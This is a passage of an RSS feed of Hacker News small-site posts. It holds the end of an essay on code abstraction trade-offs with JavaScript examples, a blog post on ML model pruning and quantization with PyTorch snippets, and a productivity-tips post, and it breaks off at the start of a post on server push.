  ...</code></pre><p>By introducing this flag, we can conditionally produce a different <code>fileURL</code>: one for CSV and one for JSON. With that we see the first concept for abstraction: configuration. You pass some configuration, and you leave it to your function to figure what to do. </p><p>So, is it a good idea? </p><h2>The key <em>advantage</em> is that our logic is centralized.</h2><p>With configuration, the caller is limited in what they can do: they can only provide flags. All the true logic stays inside <code>exportFile</code>. This means that callers of the function can√¢‚Ç¨‚Ñ¢t go crazy and do something unsupported. And that could give us some peace of mind.</p><h2>The key <em>disadvantage</em> is that√¢‚Ç¨¬¶our logic is centralized.</h2><p>This will work, but let√¢‚Ç¨‚Ñ¢s think about it. First, notice that in order to understand <code>exportFile</code> now, we need to understand both the CSV and JSON case. Imagine if someone opens up <code>exportFile</code> to figure out what it does:  if they <em>only</em> cared about JSON, they now have to understand more logic than they needed. Anyone who changes the logic for CSV, may also end up breaking JSON. <code>**exportFile**</code> <strong>has become</strong> <a href="https://www.infoq.com/presentations/Simple-Made-Easy/" target="_blank"><strong>complected</strong></a><strong>.</strong></p><p>Notice also, that because the caller of this function can <em>only</em> provide flags, their hands are tied for use-cases that you didn√¢‚Ç¨‚Ñ¢t support. This was supposed to give you peace of mind, but it certainly can frustrate callers. imagine if they wanted to support XML, what could they do? They√¢‚Ç¨‚Ñ¢d have to edit <code>exportFile</code> to support this case. (God forbid they edit it to be something like <code>exportFile(isCSV, isXML)</code> √¢‚Ç¨‚Äù now you have invariant conditions on your hands). By being so specific, you√¢‚Ç¨‚Ñ¢ve chosen to make your function less abstract √¢‚Ç¨‚Äù this of course means that it is less powerful.  <code>**exportFile**</code> <strong>has become hard to extend</strong></p><h2>For better or worse, configuration gives the caller the least amount of power</h2><p>If you imagine a sort power spectrum, where the caller has the least power on the left, and most power on the right, configuration would be on the left. You control what the caller does so tightly that it gives your certainty, but makes your function more complex and less useful. </p><p>Say you wanted to address the problems, and move to the right of this spectrum, what could you do? </p><p>Well, if you look at what we wrote, we can notice that the only part that is <em>really</em> different, is the bit about taking <code>exportData</code>, and creating a <code>fileURL</code>. </p><pre><code>...
const exportableData = toExportableData(data); // ExportableData
... // *This can be different! Somehow we need to get a fileURL* 
setFileURL(fileURL);
...</code></pre><p>So one thing we can do is this: instead of providing a flag, we can provide a function: </p><pre><code>function exportFile(exportableDataToFileURL) { 
  setLoading(true);
  try {
    const data = getData(); // [Data, Data, Data]
    const exportableData = toExportableData(data); // ExportableData
    const fileURL = exportableDataToFileURL(exportableData)
    setFileURL(fileURL);
  } finally {
    setLoading(false)
  }
}</code></pre><p>Now, for JSON, we can write </p><pre><code>exportFile((exportableData) =&gt; { 
  return saveFile("export.json", JSON.stringify(exportableData));
})</code></pre><p>and for CSV we can write: </p><pre><code>exportFile((exportableData) =&gt; { 
  return saveFile("export.csv", toCSVStr(exportableData));
})</code></pre><p>Oky doke, this is cool. </p><h2>The key <em>advantage</em> is that you give the caller more power</h2><p>With this we solve both of the problems we had with configuration. Now if someone looks under the hood at <code>exportFile</code>, they won√¢‚Ç¨‚Ñ¢t see unrelated code about csv. If they wanted to extend to XML, they can simply provide a different function. We√¢‚Ç¨‚Ñ¢ve given the caller much more power</p><h2>The key <em>disadvantage</em> is that it can be either too powerful or not powerful enough</h2><p>We√¢‚Ç¨‚Ñ¢ve abstracted further, but there is a price there. The first is, that we <em>think</em> we know that what we <em>really</em> need to pass outwards is <code>exportableData</code>, and what we need to return is a <code>fileURL</code>. What if we were wrong? For example, some may need a slightly different data format √¢‚Ç¨‚Äù instead of <code>exportableData</code> they need <code>someOtherKindOfExportableData</code>. By the time we figured that out, it√¢‚Ç¨‚Ñ¢s possible that there are numerous new usages of <code>exportFile</code>, which we√¢‚Ç¨‚Ñ¢ll have to support as we evolve this function.</p><p>One way we could have prevented this, is to have stuck with configuration. This way, anyone who wanted to support something would have to funnel through this function, which would give us time to think about what the best abstraction was. </p><p>Another way, would have been if this function was abstracted even further, so callers could have easily supported <code>someOtherKindOfExportableData</code>.</p><h2>Inversion lies in the middle of the power spectrum</h2><p>Inversion is more powerful than configuration, but it√¢‚Ç¨‚Ñ¢s not the most powerful method. This can be a great choice, but you risk either being too powerful and exposing errors, or not being powerful enough and restricting callers. </p><p>We know the less powerful option: configuration. What would the most powerful one look like?</p><p>The next thing we may notice, is that our <code>exportFile</code> function is actually built up some building blocks that could be useful for a bunch of different things. For example, many functions may want a loading state, or just need to get <code>exportableData</code>, etc. We could create those building blocks:</p><pre><code>function exportJSONFile() { 
  withLoading(() =&gt; saveJSONFile(getExportableData()))
}


function exportCSVFile() { 
  withLoading(() =&gt; saveCSVFile(getExportableData()))
}</code></pre><h2>The key advantage is that the user gets the most power</h2><p>The building blocks that we just built, can be used in a myriad of ways. The user can support CSV, XML, can use <code>isLoading</code> with some other function, and choose to provide a different kind of <code>exportableData</code>.  We√¢‚Ç¨‚Ñ¢ve provided a lot of power for the user.</p><h2>The key disadvantage is that you are the most vulnerable to mistakes</h2><p>The disadvantage though, like in the case of inversion, is that we open ourselves up to a lot of mistakes. What if <code>isLoading</code> was really meant for files, and other things should have been using a different flag? What if people start using <code>saveJSONFile</code>, and pass data that wasn√¢‚Ç¨‚Ñ¢t really an export? These are all cases that we have implicitly allowed with our abstractions. </p><p>There√¢‚Ç¨‚Ñ¢s a further problem: notice that with our first example of <code>exportFile</code>, you the code was more concrete: you could see what was actually happening. When code is more abstract, it√¢‚Ç¨‚Ñ¢s a bit harder to reason about what is <em>actually</em> happening. Now, it can be worth it for the power gains, but if you optimized prematurely, you√¢‚Ç¨‚Ñ¢re just paying this price for nothing. An example of this unnecessary price is <code>saveJSONFile</code> and <code>saveCSVFile</code> √¢‚Ç¨‚Äù if we had <a href="http://number-none.com/blow/john_carmack_on_inlined_code.html" target="_blank">inlined</a> those, the overall composition would still be abstract but more understandable. These are the kind of things to watch out for as you abstract at this level.</p><h2>Composition is at the end of the spectrum</h2><p>And with that, we see that composition gives us the most power, but gives us the most opportunities to shoot ourselves in the foot. Boy can it be worth it though. </p><p>It√¢‚Ç¨‚Ñ¢s funny to notice that with each option, the pro <em>is</em> the con. So how do we pick? I think one heuristic you can use is this: pick the most powerful option you can limited by your confidence. For example, if you have a light understanding of the problem, stay on the lower side of the abstraction spectrum. As you understand more (say, time to introduce XML) you can evolve to the powerful side of the spectrum. When you√¢‚Ç¨‚Ñ¢re <em>very</em> confident, and you can see good use-cases for your building blocks, lean to the most powerful side of the spectrum. </p><p><em>Thanks to Daniel Woelfel, Alex Reichert, Julien Odent for reviewing drafts of this essay</em></p></span></p></div></div></div>]]>
            </description>
            <link>https://stopa.io/post/251</link>
            <guid isPermaLink="false">hacker-news-small-sites-24590779</guid>
            <pubDate>Fri, 25 Sep 2020 15:24:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Making ML Models Smaller]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24590706">thread link</a>) | @amandeepspdhr
<br/>
September 25, 2020 | https://amandeepsp.github.io/making-models-smaller-1 | <a href="https://web.archive.org/web/*/https://amandeepsp.github.io/making-models-smaller-1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Machine Learning models are getting bigger and expensive to compute. Embedded devices have
restricted memory, computation power and battery. But we can optimize our model to run smoothly on
these devices. By reducing the size of the model we decrease the number of operations that need to
be done hence reducing the computation. Smaller models also trivially translate into less memory
usage. Smaller models are also more power-efficient. One must think that a reduced number of
computations is responsible for less power consumption, but on the contrary, the power draw from
memory access is about 1000x more costly than addition or multiplication. <!--more--> Now since
there are no free lunches i.e. everything comes at a cost, we lose some accuracy of our models here.
Bear in mind these speedups are not for training but inference only.</p>
<blockquote>
<p><a href="https://amandeepsp.github.io/making-models-smaller-2">Part 2</a> of the post can be found here.</p>
</blockquote>
<h2>Pruning</h2>
<!--proof-read-->
<p>Pruning is removing excess network connections that do not hugely contribute to the output. Ideas of
pruning networks are very old dating back to 1990s namely <a href="https://papers.nips.cc/paper/250-optimal-brain-damage.pdf"><em>Optimal Brain Damage</em></a> and
<a href="https://papers.nips.cc/paper/749-optimal-brain-surgeon-extensions-and-performance-comparisons.pdf"><em>Optimal Brain Surgeon</em></a>. These methods use Hessians to determine the importance of
connections, which also makes them impractical to use with deep networks. Pruning methods use an
iterative training technique i.e. <em>Train <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>‚áí</mo></mrow><annotation encoding="application/x-tex">\Rightarrow</annotation></semantics></math></span></span> Prune <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>‚áí</mo></mrow><annotation encoding="application/x-tex">\Rightarrow</annotation></semantics></math></span></span> Fine-tune</em>. Fine-tuning
after pruning restores the accuracy of the network lost after pruning. One method is to rank the
weights in the network using the L1/L2 norm and remove the last x% of them. Other types of methods
which also use ranking use the mean activation of neurons, the number of times a neuron's activation
is zero on a validation set and many other creative methods. This approach is pioneered by <a href="https://arxiv.org/abs/1506.02626">Han
et.al.</a> in their 2015 paper.</p>
<p><span>
      <a href="https://amandeepsp.github.io/static/0191f9ae896421e898e1b7ff6fdd7a4f/aa08e/pruning.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="pruning" title="pruning" src="https://amandeepsp.github.io/static/0191f9ae896421e898e1b7ff6fdd7a4f/a6d36/pruning.png" srcset="https://amandeepsp.github.io/static/0191f9ae896421e898e1b7ff6fdd7a4f/222b7/pruning.png 163w,
https://amandeepsp.github.io/static/0191f9ae896421e898e1b7ff6fdd7a4f/ff46a/pruning.png 325w,
https://amandeepsp.github.io/static/0191f9ae896421e898e1b7ff6fdd7a4f/a6d36/pruning.png 650w,
https://amandeepsp.github.io/static/0191f9ae896421e898e1b7ff6fdd7a4f/aa08e/pruning.png 967w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span> <em>Fig 1. Pruning in neural networks from <a href="https://arxiv.org/abs/1506.02626">Han et. al.</a></em></p>
<p>Even more recently in 2019, the <a href="https://arxiv.org/abs/1803.03635">Frankle et.al.</a> paper titled <em>The Lottery Ticket
Hypothesis</em> the authors found out that within every deep neural network there exists a subset of it
which gives the same accuracy for an equal amount of training. These results hold for unstructured
pruning which prunes the whole network which gives us a sparse network. Sparse networks are
inefficient on GPUs since there is no structure to their computation. To remedy this, structured
pruning is done, which prunes a part of the network e.g. a layer or a channel. The Lottery Ticket
discussed earlier is found no to work here by <a href="https://arxiv.org/abs/1810.05270">Liu et.al.</a> They instead discovered that it was
better to retrain a network after pruning instead of fine-tuning. Aside from performance is there
any other use of sparse networks? Yes, sparse networks are more robust to noise input as shown in a
paper by <a href="https://arxiv.org/abs/1903.11257">Ahmed et.al.</a> Pruning is supported in both TF (<code>tensorflow_model_optimization</code>
package) and PyTorch (<code>torch.nn.utils.prune</code>).</p>
<p>To use pruning in PyTorch you can either select a technique class from <code>torch.nn.utils.prune</code> or
implement your subclass of <code>BasePruningMethod</code>.</p>
<div data-language="python"><pre><code><span>from</span> torch<span>.</span>nn<span>.</span>utils <span>import</span> prune
tensor <span>=</span> torch<span>.</span>rand<span>(</span><span>2</span><span>,</span> <span>5</span><span>)</span>
pruner <span>=</span> prune<span>.</span>L1Unstructured<span>(</span>amount<span>=</span><span>0.7</span><span>)</span>
pruned_tensor <span>=</span> pruner<span>.</span>prune<span>(</span>tensor<span>)</span></code></pre></div>
<p>To prune a module we can use pruning methods (basically wrappers on the classes discussed above)
given in <code>torch.nn.utils.prune</code> and specify which module you want to prune, or even which parameter
within that module.</p>
<div data-language="python"><pre><code>conv_1 <span>=</span> nn<span>.</span>Conv<span>(</span><span>3</span><span>,</span> <span>1</span><span>,</span> <span>2</span><span>)</span>
prune<span>.</span>ln_structured<span>(</span>module<span>=</span>conv_1<span>,</span> name<span>=</span><span>'weight'</span><span>,</span> amount<span>=</span><span>5</span><span>,</span> n<span>=</span><span>2</span><span>,</span> dim<span>=</span><span>1</span><span>)</span></code></pre></div>
<p>This replaces the parameter <code>weight</code> with the pruned result and adds a parameter <code>weight_orig</code> that
stores the unpruned version of the input. The pruning mask is stored as <code>weight_mask</code> and saved as a
module buffer. These can be checked by the <code>module.named_parameters()</code> and <code>module.named_buffers()</code>.
To enable iterative pruning we can use just apply the pruning method for the next iteration and it
just works, due to <code>PruningContainer</code> as it handles computation of final mask taking into account
previous prunings using the <code>compute_mask</code> method.</p>
<h2>Quantization</h2>
<p>Quantization is to restrict the number of possible values a weight can take, this will reduce the
memory a weight can reduce and in turn reduce the model size. One way of doing this is changing the
bit-width of the floating-point number used for storing the weights. A number stored as a 32-bit
floating-point or FP32 to an FP16 or an 8-bit fixed-point number and more increasingly an 8-bit
integer. Bit width reductions have many advantages as below.</p>
<ul>
<li>Moving from 32-bit to 8-bit gives us a <em>4x</em> memory advantage straight away.</li>
<li>Lower bit width also means that we can squeeze me more numbers in registers/caches with leads to
less RAM access and in-turn less time and power consumption.</li>
<li>Integer computation is always faster than floating-point ones.</li>
</ul>
<p>This works because neural nets are pretty robust to small perturbations to their weights and we can
easily round off them without having much effect on the accuracy of the network. Moreover, weights
are not contained in very large ranges due to regularization techniques used in training, hence we
do not have to use large ranges, say ~ <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>‚àí</mo><mn>3.4</mn><mo>√ó</mo><mn>1</mn><msup><mn>0</mn><mn>38</mn></msup></mrow><annotation encoding="application/x-tex">-3.4\times10^{38}</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3.4</mn><mo>√ó</mo><mn>1</mn><msup><mn>0</mn><mn>38</mn></msup></mrow><annotation encoding="application/x-tex">3.4\times10^{38}</annotation></semantics></math></span></span> for a 32-bit
floating -point. For example, in the image below the weight values in MobileNet are all very close
to zero.</p>
<p><img src="https://amandeepsp.github.io/872dc46115677ed1c77ec3381764efde/mobilenet1-weight-distribution.svg"> <em>Fig 2. Weight distribution of 10 layers of
MobileNetV1.</em></p>
<p>A Quantization scheme is how we transform our real weights to quantized one, a very rudimentary form
of the scheme is linear scaling. Say we want to transform values in range <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msub><mi>r</mi><mrow><mi>m</mi><mi>i</mi><mi>n</mi></mrow></msub><mo separator="true">,</mo><msub><mi>r</mi><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[ r_{min}, r_{max} ]</annotation></semantics></math></span></span> to
an integer range of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><msub><mi>I</mi><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0, I_{max}]</annotation></semantics></math></span></span>, where <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></msub></mrow><annotation encoding="application/x-tex">I_{max}</annotation></semantics></math></span></span> is <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>B</mi></msup><mo>‚àí</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^B -1</annotation></semantics></math></span></span>, <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span></span> being the bit-width of our
integer representation. Hence,</p>
<p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>r</mi><mo>=</mo><mfrac><mrow><msub><mi>r</mi><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></msub><mo>‚àí</mo><msub><mi>r</mi><mrow><mi>m</mi><mi>i</mi><mi>n</mi></mrow></msub></mrow><mrow><msub><mi>I</mi><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></msub><mo>‚àí</mo><mn>0</mn></mrow></mfrac><mo stretchy="false">(</mo><mi>q</mi><mo>‚àí</mo><mi>z</mi><mo stretchy="false">)</mo><mo>=</mo><mi>s</mi><mo stretchy="false">(</mo><mi>q</mi><mo>‚àí</mo><mi>z</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">r = \frac{r_{max} - r_{min}}{I_{max} - 0 } (q - z) = s (q-z)</annotation></semantics></math></span></span></span></p><p>where <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span></span> is the original value of the weight, <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span></span> is the scale, <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span></span> is the quantized value and <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>z</mi></mrow><annotation encoding="application/x-tex">z</annotation></semantics></math></span></span>
is the value that maps to <code>0.0f</code>. This is also known as an <em>affine mapping</em>. Since <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span></span> is integer
results are rounded off. Now the problem arises how we choose <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>r</mi><mrow><mi>m</mi><mi>i</mi><mi>n</mi></mrow></msub></mrow><annotation encoding="application/x-tex">r_{min}</annotation></semantics></math></span></span> and <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>r</mi><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></msub></mrow><annotation encoding="application/x-tex">r_{max}</annotation></semantics></math></span></span>. A simple
method to achieve this is generating distributions of weights and activations and then taking their
<a href="https://en.wikipedia.org/wiki/Kullback%E2%80%93Leibler_divergence"><em>KL divergences</em></a> with quantized distributions and use the one with min divergence from the
original. A more elegant way to do this is using <em>Fake Quantization</em> i.e. introduce quantization
aware layers into the network during training. This idea is proposed by <a href="https://arxiv.org/abs/1712.05877"><em>Jacob et. al.</em></a>.</p>
<p><span>
      <a href="https://amandeepsp.github.io/static/8f84ecb013f45f8ae7328bfeefcd558a/0940f/fake_quant.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="fake quant" title="fake quant" src="https://amandeepsp.github.io/static/8f84ecb013f45f8ae7328bfeefcd558a/a6d36/fake_quant.png" srcset="https://amandeepsp.github.io/static/8f84ecb013f45f8ae7328bfeefcd558a/222b7/fake_quant.png 163w,
https://amandeepsp.github.io/static/8f84ecb013f45f8ae7328bfeefcd558a/ff46a/fake_quant.png 325w,
https://amandeepsp.github.io/static/8f84ecb013f45f8ae7328bfeefcd558a/a6d36/fake_quant.png 650w,
https://amandeepsp.github.io/static/8f84ecb013f45f8ae7328bfeefcd558a/e548f/fake_quant.png 975w,
https://amandeepsp.github.io/static/8f84ecb013f45f8ae7328bfeefcd558a/0940f/fake_quant.png 1154w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span> <em>Fig 3. (a) Normal conv layer, (b) Conv layer with fake quantization
units added, (c) Comparison of quantized network's latency and accuracy. Image from</em> <a href="https://arxiv.org/abs/1712.05877"><em>Jacob et.
al.</em></a></p>
<p>While training the <em>Fake quantization</em> node calculates the ranges for the weights and activations
and store their moving average. After training, we quantize the network with this range to get
better performance.</p>
<p>More drastic bit-width also explored in papers on XOR nets by <a href="https://arxiv.org/abs/1603.05279"><em>Rastegari et.al</em></a>, Ternary
nets by <a href="https://arxiv.org/abs/1602.02830"><em>Courbariaux et. al.</em></a> and Binary nets by <a href="https://arxiv.org/abs/1612.01064"><em>Zhu et. al.</em></a> In PyTorch 1.3,
quantization support was introduced. Three new data types are introduced for quantization operations
<code>torch.quint8</code>, <code>torch.qint8</code> and <code>torch.qint32</code>. It also offers various qunatization techniques
included in <code>torch.quantization</code> package.</p>
<ul>
<li><strong>Post Training Dynamic quantization</strong> : Replaces float weights with dynamic quantized versions
of them. Weight-only quantization by default is performed for layers with large weights size -
i.e. Linear and RNN variants.</li>
</ul>
<div data-language="python"><pre><code>quantized_model <span>=</span> torch<span>.</span>quantization<span>.</span>quantize_dynamic<span>(</span>
    model<span>,</span> <span>{</span>nn<span>.</span>LSTM<span>,</span> nn<span>.</span>Linear<span>}</span><span>,</span> dtype<span>=</span>torch<span>.</span>qint8
<span>)</span></code></pre></div>
<ul>
<li><strong>Post Training Static quantization</strong> : Static quantization not only converts float weights to
int, but it also records the distribution of activations and they are used to determine the
scale of quantization at inference time. To support this calibration type quantization we add
<code>QuantStub</code> at the start of the model and <code>DeQuantStub</code> and the end of the model. It involves
steps mentioned below.</li>
</ul>
<div data-language="python"><pre><code>myModel <span>=</span> load_model<span>(</span>saved_model_dir <span>+</span> float_model_file<span>)</span><span>.</span>to<span>(</span><span>'cpu'</span><span>)</span>

myModel<span>.</span>fuse_model<span>(</span><span>)</span>




myModel<span>.</span>qconfig <span>=</span> torch<span>.</span>quantization<span>.</span>default_qconfig

torch<span>.</span>quantization<span>.</span>prepare<span>(</span>myModel<span>,</span> inplace<span>=</span><span>True</span><span>)</span>


evaluate<span>(</span>myModel<span>,</span> criterion<span>,</span> data_loader<span>,</span>
            neval_batches<span>=</span>num_calibration_batches<span>)</span>


torch<span>.</span>quantization<span>.</span>convert<span>(</span>myModel<span>,</span> inplace<span>=</span><span>True</span><span>)</span></code></pre></div>
<ul>
<li><strong>Quantization Aware Training</strong> : Uses <em>fake quantization</em> modules to store scales while
training. For enabling QAT, we use the <code>qconfig</code> to be <code>get_default_qat_qconfig('fbgemm')</code> and
instead of <code>prepare</code> use <code>prepare_qat</code>. After this, we can train or fine-tune our model and at
the end of the training, get out the quantized model using <code>torch.quantization.convert</code> same as
above.</li>
</ul>
<blockquote>
<p>Post-training quantization in PyTorch currently only support operations on CPU.</p>
</blockquote>
<p>For detailed code examples visit the PyTorch documentation <a href="https://pytorch.org/tutorials/advanced/dynamic_quantization_tutorial.html"><em>here</em></a>. On Tensorflow side
of things quantization can be done using TFLite's <code>tf.lite.TFLiteConverter</code> API by setting the
<code>optimizations</code> parameter to <code>tf.lite.Optimize.OPTIMIZE_FOR_SIZE</code>. Fake quantization is enabled by
<code>tf.contrib.quantize</code> package.</p>
<p>In the next part of <em>Making models smaller!</em> we will discuss Low-rank transforms, efficient
modelling techniques and knowledge distillation.</p>
<!--
https://sahnimanas.github.io/post/quantization-in-tflite/
https://jackwish.net/2019/neural-network-quantization-introduction.html
--></div></div>]]>
            </description>
            <link>https://amandeepsp.github.io/making-models-smaller-1</link>
            <guid isPermaLink="false">hacker-news-small-sites-24590706</guid>
            <pubDate>Fri, 25 Sep 2020 15:18:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Productivity Tips and Tricks for You]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24590704">thread link</a>) | @bhavaniravi
<br/>
September 25, 2020 | https://bhavaniravi.com/blog/how-to-be-productive | <a href="https://web.archive.org/web/*/https://bhavaniravi.com/blog/how-to-be-productive">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div>
<p>We all want to be productive, efficient and put out our best work. People continuously ask me. </p>
<blockquote>
<p>how do you find time to do all these?
how do you keep yourself motivated?
how to be consistent?
how are you so productive</p>
</blockquote>
<p>I can go ahead and give you all my tips and tricks but before that, let's take a moment to understand what productivity is.</p>
<p>Productivity is not how long you can work on something, It is how much you can accomplish in a given time. </p>
<p>In a technology-filled life, scrolling twitter for 2 hours can feel productive because you learned so much. But we can't ignore that our attention span is getting closer to that of a goldfish shoving us away from essential tasks of our life like exercising or reading.  </p>
<p>To be more productive, we have to focus on two things.</p>
<ol>
<li>Making more time</li>
<li>Using the available time efficiently</li>
</ol>
<figure>
<p><img src="https://i.imgur.com/I2TtWvg.png"></p>
</figure>
<p>Let's dissect these two in detail.</p>
<h2>Making More time</h2>
<p>Social media is a master of making us feel worthless. Quotes like "Everyone has 24 hours in a day." just rips off even the last bit of motivation have.</p>
<p>I have good news for you. No, not everybody has the same 24 hours in a day.
Some people have privilege and other people don't. While some have the privilege of outsourcing their work, others have 8-hour jobs, 3-hour travel, kids at home, cleaning, cooking, and whatnot, I get you. Some might call it an excuse. I don't think it is.</p>
<p>That said, we can't continue to live our life the same way forever. The idea of productivity can help you to add privilege to your life. Thereby you get more time to work on something that you love.</p>
<blockquote>
<p>How to make time in your super packed schedule?</p>
</blockquote>
<h2>80-20 principle</h2>
<p>The 80/20 Principle or the Pareto principle says that 80% of our results depends on 20% of the things we do. The idea is to spend 80% of your energy on doing 20% of the important things.</p>
<p>Now, after reading this blog, you will get super pumped and add exercising, diet, reading, learning, writing, and everything you have been putting off into your list. But remember, habits take time to form. We need to focus on the item, which will have a maximum impact on your life.</p>
<ol>
<li>Create a list of all the task you want to do</li>
<li>Split the list into 2 based on 80% or 20% impact</li>
<li>Sort the two list again for 80% impact</li>
<li>Pick the top item from the 80% impact list</li>
</ol>
<h2>4 Quadrant technique</h2>
<p>The book Five habits of highly effective people call this technique a 4th generation time management technique. It is not practically possible to spend time on 20% of the things all the time. For eg., what happens when your boss asks you to finish an important task? </p>
<p>The four-quadrant technique gives you a closer look at your tasks at hand. It splits the functions into four parts.</p>
<figure>
<p><img src="https://i.imgur.com/2yXicKU.png"></p>
</figure>
<ol>
<li>Create a list of tasks</li>
<li>Classify them in the above four categories</li>
<li>Focus a complete the tasks in Important Quadrant</li>
<li>Defer from focusing on tasks at Interruption and Not important</li>
<li>whenever a task enters the crisis quadrant, finish them right there</li>
</ol>
<h2>GTD - Getting Things Done</h2>
<p><a href="https://amzn.to/2FpQqFr">GTD</a> is another framework to take things to completion. It is a 5-step process.</p>
<ol>
<li>Create a list of task</li>
<li>Block some time devoid of all distraction</li>
<li>Finish the task at hand</li>
</ol>
<h2>Being Aware of Time-stealers</h2>
<p>Social media is one of the biggest time stealers. I won't call it out for robbing our day; after all, that's the only socializing we have these days. The problem is these apps are addicting, and it is hard to break the cycle.</p>
<p>Here are some tips I follow to reduce my mobile usage</p>
<ol>
<li>Install a Digital time tracker</li>
<li>Set max time for each app</li>
<li>Go to your notifications setting, Don't think twice. Switch it all off, no but's or yet's</li>
<li>Blue ticks are nothing but obligations for you to reply as soon as you see the message. Switch it off. Reply to them when you have time at hand. Schedule them all to the end of the day works wonders.</li>
</ol>
<p>Try to detox from Digital medium</p>
<ol>
<li>Use the zen-mode app on your mobile to decouple from it for hours</li>
<li>Meditate and try to be with your thoughts</li>
<li>Leave your device at the other room</li>
</ol>
<h2>How to use your time efficiently?</h2>
<p>Using time efficiently means being able to focus on the task at hand. It's called being in the state of <a href="https://amzn.to/35v4YhG">flow</a>. Have you ever captured all the motivation to start a task to find yourself lost on youtube finding the best playlist? Been there, done that.</p>
<p>As the book <a href="https://amzn.to/2DVa5w7">Deep work</a> quotes </p>
<blockquote>
<p>Who you are, what you think, feel, and do, what you love‚Äîis the sum of what you focus on.</p>
</blockquote>
<p>Here are some techniques to make the most out of your time</p>
<h2>Creating a list</h2>
<p>Creating a list is by far the best thing to get on track, but there one problem. Lists are overwhelming.
Create a list and break them down into tiny tasks
Block a small-time chunk(10 minutes) and finish a task</p>
<h2>Pomodoro technique</h2>
<p>Pomodoro technique is like strength training for your brain. You focus on a task for N minutes and take a break for 10 minutes. Continue for 3-4 sets and take a long break of 20-30 minutes after that.
By continually doing the Pomodoro technique, you are training your brain to improve its focus window. Sooner you can increase the time to 30, 40, and 60 minutes.
I love Pomodoro for this reason, and the longest streak I had was 3 hours.</p>
<h2>Building Momentum</h2>
<blockquote>
<p>One of the most challenging thing for writers is to stare at a blank page</p>
</blockquote>
<p>We all have starting trouble, but once we start doing one thing, there is a good chance we might do other things. The idea is to fuel the passion and keep the momentum up. </p>
<ol>
<li>Sandwich the task you hate along with the tasks you like. Set a timer for 5 mins and start doing it; you won't feel overwhelmed since it's low pressure.</li>
<li>Batch similar tasks together. Thereby you can remove the cognitive load involved in tasks switching</li>
</ol>
<h2>Mental &amp; Physical Health</h2>
<p>While you are putting these concepts into practice, remember your mental and physical health has a lot to do with productivity. Unlike machines, we can't add more core to improve our efficiency. We need stability and consistency.</p>
<p>Get a good sleeping routine. I can't even start to explain how fixing my sleep had made me 10x more productive and refreshed. Meditate, Meditate, Meditate, your mind can come up with new ideas or soak up new information only when it's clear. Incorporate some physical activity into your life.</p>
<p>Productivity in human beings, unlike machines, is to keep the energy and motivation up. To build momentum to start and finish the projects that we take up. There is no right or wrong way to try these methods. Try each of them, and develop a technique that suits you. Lastly, none of the frameworks will work if you are unwilling to put your part. </p></div></article></div>]]>
            </description>
            <link>https://bhavaniravi.com/blog/how-to-be-productive</link>
            <guid isPermaLink="false">hacker-news-small-sites-24590704</guid>
            <pubDate>Fri, 25 Sep 2020 15:18:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Live server push without JavaScript]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24590687">thread link</a>) | @lawik
<br/>
September 25, 2020 | https://underjord.io/live-server-push-without-js.html | <a href="https://web.archive.org/web/*/https://underjord.io/live-server-push-without-js.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<small>2020-09-25</small><!-- RSS:2020-09-25T17:00:00Z -->
<p>
